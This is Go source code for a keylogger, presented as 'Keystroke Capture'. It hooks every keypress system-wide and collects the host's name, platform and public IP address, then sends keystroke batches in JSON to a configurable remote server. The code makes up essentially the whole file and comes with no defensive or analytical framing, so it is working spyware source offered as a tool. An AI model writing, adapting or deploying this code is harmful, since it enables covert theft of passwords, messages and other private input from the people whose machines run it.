/*
Product: Keystroke Capture
Description: Captures keystrokes and relays the information
to a server
Author: Benjamin Norman 2023
*/

package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strings"

	hook "github.com/robotn/gohook"
	"github.com/shirou/gopsutil/v3/host"
)

// Does not do the Down Arrow - need to fix

var (
	hostname      = ""
	ipAddress     = ""
	platform      = ""
	apiKey        = "API KEY CHANGE ME"
	serverAddress = "http://127.0.0.1:8080/keylogger_incoming"
)

var dict_key_mapping = map[int32]string{
	97:  "a",
	98:  "b",
	99:  "c",
	100: "d",
	101: "e",
	102: "f",
	103: "g",
	104: "h",
	105: "i",
	106: "j",
	107: "k",
	108: "l",
	109: "m",
	110: "n",
	111: "o",
	112: "p",
	113: "q",
	114: "r",
	115: "s",
	116: "t",
	117: "u",
	118: "v",
	119: "w",
	120: "x",
	121: "y",
	122: "z",

	49: "1",
	50: "2",
	51: "3",
	52: "4",
	53: "5",
	54: "6",
	55: "7",
	56: "8",
	57: "9",
	48: "0",

	65: "A",
	66: "B",
	67: "C",
	68: "D",
	69: "E",
	70: "F",
	71: "G",
	72: "H",
	73: "I",
	74: "J",
	75: "K",
	76: "L",
	77: "M",
	78: "N",
	79: "O",
	80: "P",
	81: "Q",
	82: "R",
	83: "S",
	84: "T",
	85: "U",
	86: "V",
	87: "W",
	88: "X",
	89: "Y",
	90: "Z",

	33:   "!",
	64:   "@",
	163:  "£",
	36:   "$",
	37:   "%",
	94:   "^",
	38:   "&",
	42:   "*",
	40:   "(",
	41:   ")",
	45:   "-",
	61:   "=",
	95:   "_",
	43:   "+",
	177:  "±",
	167:  "§",
	96:   "`",
	126:  "~",
	91:   "[",
	93:   "]",
	59:   ";",
	39:   "'",
	92:   "\\",
	44:   ",",
	46:   ".",
	47:   "/",
	60:   "<",
	62:   ">",
	63:   "?",
	58:   ":",
	34:   "\"",
	124:  "|",
	123:  "{",
	125:  "}",
	8364: "€",
	35:   "#",

	8:  "BACKSPACE",
	13: "ENTER",
	27: "ESC",
	9:  "TAB",
	32: "SPACE",
	30: "UP ARROW",
	28: "LEFT ARROW",
	29: "RIGHT ARROW"}

func key_mapper() {

	// Used for finding out the KeyChar of
	// a key that is typed so it can be added to the map
	// USE ONLY FOR UPDATING THE KEY MAPPING

	fmt.Println("Key Mapper Begins:")
	evChan := hook.Start()
	defer hook.End()
	for ev := range evChan {
		if ev.Keychar != int32(65535) && ev.Keychar != int32(0) {
			fmt.Println(ev.Keychar)
		}
	}
}

func data_transfer(buffer []string, ipAddress string, hostname string, platform string) {
	/*
		Sends the data to the target server as a POST
		request with a JSON body
	*/

	// merges the list to a single string, need to fix this to just append the slice to the map

	mergedBuffer := strings.Join(buffer, ",")

	// Encode the JSON data
	postBody, _ := json.Marshal(map[string]string{
		"apiKey":    apiKey,
		"ipAddress": ipAddress,
		"hostname":  hostname,
		"platform":  platform,
		"data":      mergedBuffer,
	})

	responseBody := bytes.NewBuffer(postBody)
	resp, err := http.Post(serverAddress, "application/json", responseBody)

	if err != nil {
		log.Fatalf("An Error Occured %v", err)
		fmt.Println(err)
	}
	defer resp.Body.Close()
}

func fetch_ip_address() (ipAddress string) {

	// Fetches the public IP address of the target machine

	resp, err := http.Get("https://api.ipify.org?format=json")

	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		log.Fatal(err)
	}
	// Convert the body response from string into a JSON obj
	var jsonMap map[string]interface{}
	json.Unmarshal([]byte(string(body)), &jsonMap)
	ipAddress = jsonMap["ip"].(string)

	return ipAddress
}

/*

Store the data in a buffer, when a key hasn't been pressed for more than 5 seconds send
the contents of the buffer to the receiving server. Leave gaps between each letter.

Store the buffer as a string

*/

func main() {

	// Collects info about the host

	hostStat, _ := host.Info()

	hostname = hostStat.Hostname
	platform = fmt.Sprintf("%s %s", hostStat.Platform, hostStat.PlatformVersion)
	ipAddress = fetch_ip_address()

	// Creates a buffer to store the keystrokes
	buffer := []string{}

	// Begins the keystroke capture
	evChan := hook.Start()
	defer hook.End()

	for ev := range evChan {
		if len(buffer) >= 12 {
			data_transfer(buffer, ipAddress, hostname, platform)
			buffer = buffer[:0]
		}
		if ev.Keychar != int32(65535) && ev.Keychar != int32(0) {
			value, ok := dict_key_mapping[ev.Keychar]
			if ok {
				buffer = append(buffer, value)

			} else {
				buffer = append(buffer, "key not found: %s", string(ev.Keychar))
			}
		}
	}

}
